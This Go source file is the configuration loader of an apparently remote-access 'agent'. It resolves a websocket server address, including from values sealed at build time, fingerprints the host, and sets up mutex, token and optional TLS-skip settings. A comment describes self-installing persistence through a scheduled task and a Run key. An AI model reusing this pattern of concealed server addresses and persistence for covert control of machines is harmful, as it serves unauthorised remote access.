package config

import (
        "crypto/ed25519"
        "crypto/sha256"
        "encoding/base64"
        "encoding/hex"
        "encoding/json"
        "errors"
        "fmt"
        "log"
        "net/url"
        "os"
        "path/filepath"
        "runtime"
        "strings"

        "core/cmd/agent/cryptobox"
)

var AgentVersion = "1.6.3"

// DefaultServerURL is the server endpoint baked into the binary at build
// time via -ldflags "-X core/cmd/agent/config.DefaultServerURL=...".
//
// Resolution order at runtime is:
//   1. The NUBYONE_SERVER environment variable (operator override).
//   2. A "server" field in config/settings.json next to the executable
//      (per-host override; auto-created on first run from this default).
//   3. This compiled-in default (always present, makes the EXE
//      self-sufficient with no external file required).
//
// The loopback value below is only used for unsigned local dev builds.
var DefaultServerURL = "wss://127.0.0.1:5173"
var DefaultMutex = ""
var DefaultID = ""
var DefaultCountry = ""
var DefaultAgentToken = ""
var DefaultBuildTag = ""
var DefaultBuildID = ""
var DefaultCACertURL = ""
var DefaultTLSInsecureSkipVerify = "false"

// DisableBootstrap is injected at build time via
// -ldflags "-X core/cmd/agent/config.DisableBootstrap=true".
// When "true", the self-install bootstrap is skipped entirely and the
// agent connects immediately without copying itself, registering a
// scheduled task, or writing any Run key. Use this for environments
// where persistence is managed externally (GPO, Intune, SCCM, etc.).
var DisableBootstrap = "false"

// Sealed counterparts: optional, base64-encoded ciphertext produced by the
// server's cryptobox at build time and injected via -ldflags -X. When
// non-empty AND a BuildSecret is also injected, these take precedence over
// the plaintext Default* values above. The plaintext defaults are kept as a
// universal fallback so unsealed / legacy builds keep working.
var SealedServerURL = ""
var SealedAgentToken = ""
var SealedBuildTag = ""
var SealedBuildID = ""

// Ed25519 JWT build identity — injected at build time.
//
//   BuildJWT       — compact JWS token (header.payload.sig, base64url-encoded).
//                    Contains: buildId, serverURL, expiry, buildTag.
//                    Signed by the server's Ed25519 private key.
//   ServerPublicKey — raw 32-byte Ed25519 public key, base64-Std encoded.
//                    Used by VerifyBuildJWT() to authenticate the JWT.
//
// Verification is soft: if either var is empty (unsigned dev build) the check
// passes silently. Only a present-but-invalid signature is a hard warning.
var BuildJWT = ""
var ServerPublicKey = ""

// VerifyBuildJWT verifies the build JWT using the embedded server public key.
// Returns nil if JWT is absent (unsigned dev build) or the signature is valid.
// Returns an error only if a JWT is present but the signature does not match.
func VerifyBuildJWT() error {
        jwt := strings.TrimSpace(BuildJWT)
        pubB64 := strings.TrimSpace(ServerPublicKey)
        if jwt == "" || pubB64 == "" {
                return nil // unsigned dev build — allowed
        }

        parts := strings.SplitN(jwt, ".", 3)
        if len(parts) != 3 {
                return errors.New("jwt: malformed token (expected 3 dot-separated parts)")
        }

        // Verify signature over "<header>.<payload>".
        msg := []byte(parts[0] + "." + parts[1])

        // base64url-encoded signature (no padding).
        sigPad := parts[2]
        if rem := len(sigPad) % 4; rem != 0 {
                sigPad += strings.Repeat("=", 4-rem)
        }
        sig, err := base64.URLEncoding.DecodeString(sigPad)
        if err != nil {
                // try raw url encoding
                if sig2, err2 := base64.RawURLEncoding.DecodeString(parts[2]); err2 == nil {
                        sig = sig2
                } else {
                        return fmt.Errorf("jwt: bad signature encoding: %w", err)
                }
        }

        // Decode public key (base64-Std, raw 32 bytes).
        pubBytes, err := base64.StdEncoding.DecodeString(pubB64)
        if err != nil {
                if b2, err2 := base64.RawStdEncoding.DecodeString(pubB64); err2 == nil {
                        pubBytes = b2
                } else {
                        return fmt.Errorf("jwt: bad public key encoding: %w", err)
                }
        }
        if len(pubBytes) != ed25519.PublicKeySize {
                return fmt.Errorf("jwt: invalid public key length %d (want 32)", len(pubBytes))
        }

        if !ed25519.Verify(ed25519.PublicKey(pubBytes), msg, sig) {
                return errors.New("jwt: signature verification failed — binary may be tampered")
        }
        return nil
}

const settingsFileName = "settings.json"
const serverIndexFileName = "server_index.json"
const configDirName = "config"

type settings struct {
        Server  string `json:"server"`
        ID      string `json:"id"`
        HWID    string `json:"hwid"`
        Country string `json:"country"`
        Version string `json:"version"`
}

// resolveConfigPath returns the on-disk location of a config file.
//
// It first looks for `<exe-dir>/config/<name>` (the canonical install
// layout produced by the .ps1/.sh installers and by the bundled ZIP
// download), and falls back to a CWD-relative path for backwards
// compatibility with development runs.
func resolveConfigPath(name string) string {
        exe, err := os.Executable()
        if err == nil {
                candidate := filepath.Join(filepath.Dir(exe), configDirName, name)
                if _, err := os.Stat(candidate); err == nil {
                        return candidate
                }
        }
        return filepath.Join(configDirName, name)
}

type serverIndexData struct {
        LastWorkingIndex int `json:"last_working_index"`
}

type Config struct {
        ServerURLs            []string
        ServerIndex           int
        Mutex                 string
        ID                    string
        HWID                  string
        Country               string
        OS                    string
        Arch                  string
        Version               string
        TLSInsecureSkipVerify bool
        TLSCAPath             string
        TLSClientCert         string
        TLSClientKey          string
        AgentToken            string
        BuildTag              string
        BuildID               string
}

func Load() Config {
        // Verify the Ed25519 build JWT on every startup. This is a soft check:
        // unsigned dev builds (empty JWT) pass silently. Only a present-but-
        // invalid signature is flagged — which indicates binary tampering.
        if err := VerifyBuildJWT(); err != nil {
                log.Printf("[config] WARNING: %v", err)
        }

        // The EXE is fully self-sufficient: the server URL is baked in at
        // build time via -ldflags -X. We do NOT create a sidecar
        // config/settings.json next to the executable — that would litter
        // the user's working directory with a config folder on every run.
        // If a sidecar settings.json already exists (placed there
        // intentionally by an operator), readSettings() will still pick it
        // up and let it override the baked-in default.
        fileSettings := readSettings()

        // Server URL precedence:
        //   env > settings.json > sealed compiled-in > plaintext compiled-in.
        // The sealed value (if injected at build time) is JIT-decrypted via
        // cryptobox.OpenLazy so its plaintext form lives in memory only at
        // resolution time.
        server := strings.TrimSpace(os.Getenv("NUBYONE_SERVER"))
        if server == "" {
                server = strings.TrimSpace(fileSettings.Server)
        }
        if server == "" {
                server = cryptobox.MustOpenStringOr(SealedServerURL, "config/server_url", "")
        }
        if server == "" {
                server = DefaultServerURL
        }

        serverURLs := []string{}
        for _, url := range strings.Split(server, ",") {
                normalized, err := normalizeServerURL(url)
                if err != nil {
                        log.Printf("[config] WARNING: invalid server URL %q: %v", strings.TrimSpace(url), err)
                        continue
                }
                if normalized != "" {
                        serverURLs = append(serverURLs, normalized)
                }
        }

        serverIndex := loadServerIndex()
        defaultHWID := deriveHWID()
        tlsInsecureSkipVerify := isTruthy(DefaultTLSInsecureSkipVerify)
        if v := strings.ToLower(strings.TrimSpace(os.Getenv("NUBYONE_TLS_INSECURE_SKIP_VERIFY"))); v != "" {
                tlsInsecureSkipVerify = v == "true" || v == "1" || v == "yes"
        }
        tlsCAPath := strings.TrimSpace(os.Getenv("NUBYONE_TLS_CA"))
        tlsClientCert := strings.TrimSpace(os.Getenv("NUBYONE_TLS_CLIENT_CERT"))
        tlsClientKey := strings.TrimSpace(os.Getenv("NUBYONE_TLS_CLIENT_KEY"))
        agentToken := strings.TrimSpace(os.Getenv("NUBYONE_AGENT_TOKEN"))
        if agentToken == "" {
                agentToken = cryptobox.MustOpenStringOr(SealedAgentToken, "config/agent_token", strings.TrimSpace(DefaultAgentToken))
        }

        buildTag := cryptobox.MustOpenStringOr(SealedBuildTag, "config/build_tag", strings.TrimSpace(DefaultBuildTag))
        buildID := cryptobox.MustOpenStringOr(SealedBuildID, "config/build_id", strings.TrimSpace(DefaultBuildID))

        mutex := strings.TrimSpace(os.Getenv("NUBYONE_MUTEX"))
        if mutex == "" {
                mutex = DefaultMutex
        }
        mutexLower := strings.ToLower(strings.TrimSpace(mutex))
        if mutexLower == "none" || mutexLower == "disabled" {
                mutex = ""
        }

        return Config{
                ServerURLs:            serverURLs,
                ServerIndex:           serverIndex,
                Mutex:                 strings.TrimSpace(mutex),
                ID:                    defaultHWID,
                HWID:                  firstNonEmpty(fileSettings.HWID, defaultHWID),
                Country:               firstNonEmpty(strings.TrimSpace(fileSettings.Country), DefaultCountry),
                OS:                    runtime.GOOS,
                Arch:                  runtime.GOARCH,
                Version:               firstNonEmpty(fileSettings.Version, AgentVersion),
                TLSInsecureSkipVerify: tlsInsecureSkipVerify,
                TLSCAPath:             tlsCAPath,
                TLSClientCert:         tlsClientCert,
                TLSClientKey:          tlsClientKey,
                AgentToken:            agentToken,
                BuildTag:              buildTag,
                BuildID:               buildID,
        }
}

// IsTruthy returns true for "true", "1", "yes", or "y" (case-insensitive).
// Exported so callers outside the package (e.g. main) can evaluate
// build-time flag variables without duplicating the logic.
func IsTruthy(value string) bool {
        v := strings.ToLower(strings.TrimSpace(value))
        return v == "true" || v == "1" || v == "yes" || v == "y"
}

// keep an unexported alias so internal callers in this file compile
// without change.
func isTruthy(value string) bool { return IsTruthy(value) }

func loadServerIndex() int {
        bytes, err := os.ReadFile(resolveConfigPath(serverIndexFileName))
        if err != nil {
                return 0
        }
        var data serverIndexData
        if err := json.Unmarshal(bytes, &data); err != nil {
                return 0
        }
        return data.LastWorkingIndex
}

func SaveServerIndex(index int) error {
        data := serverIndexData{LastWorkingIndex: index}
        bytes, err := json.Marshal(data)
        if err != nil {
                return err
        }
        path := resolveConfigPath(serverIndexFileName)
        _ = os.MkdirAll(filepath.Dir(path), 0o755)
        return os.WriteFile(path, bytes, 0644)
}

func readSettings() settings {
        bytes, err := os.ReadFile(resolveConfigPath(settingsFileName))
        if err != nil {
                return settings{}
        }
        var s settings
        if err := json.Unmarshal(bytes, &s); err != nil {
                return settings{}
        }
        return s
}

func firstNonEmpty(values ...string) string {
        for _, v := range values {
                if strings.TrimSpace(v) != "" {
                        return v
                }
        }
        return ""
}

func deriveHWID() string {
        h := sha256.New()
        h.Write([]byte(hostname()))
        h.Write([]byte("|"))
        h.Write([]byte(os.Getenv("USERNAME")))
        h.Write([]byte("|"))
        h.Write([]byte(runtime.GOOS))
        h.Write([]byte("|"))
        h.Write([]byte(runtime.GOARCH))
        return hex.EncodeToString(h.Sum(nil))
}

func hostname() string {
        h, err := os.Hostname()
        if err != nil {
                return "unknown"
        }
        return h
}

func normalizeServerURL(raw string) (string, error) {
        trimmed := strings.TrimSpace(raw)
        if trimmed == "" {
                return "", nil
        }

        normalized := trimmed
        if !strings.Contains(normalized, "://") {
                normalized = "wss://" + normalized
        }

        parsed, err := url.Parse(normalized)
        if err != nil {
                return "", err
        }

        switch strings.ToLower(parsed.Scheme) {
        case "ws", "wss":
        case "http":
                parsed.Scheme = "ws"
        case "https":
                parsed.Scheme = "wss"
        default:
                return "", fmt.Errorf("unsupported scheme: %s", parsed.Scheme)
        }

        if parsed.Host == "" {
                return "", fmt.Errorf("missing host")
        }

        parsed.Path = strings.TrimRight(parsed.Path, "/")
        return parsed.String(), nil
}
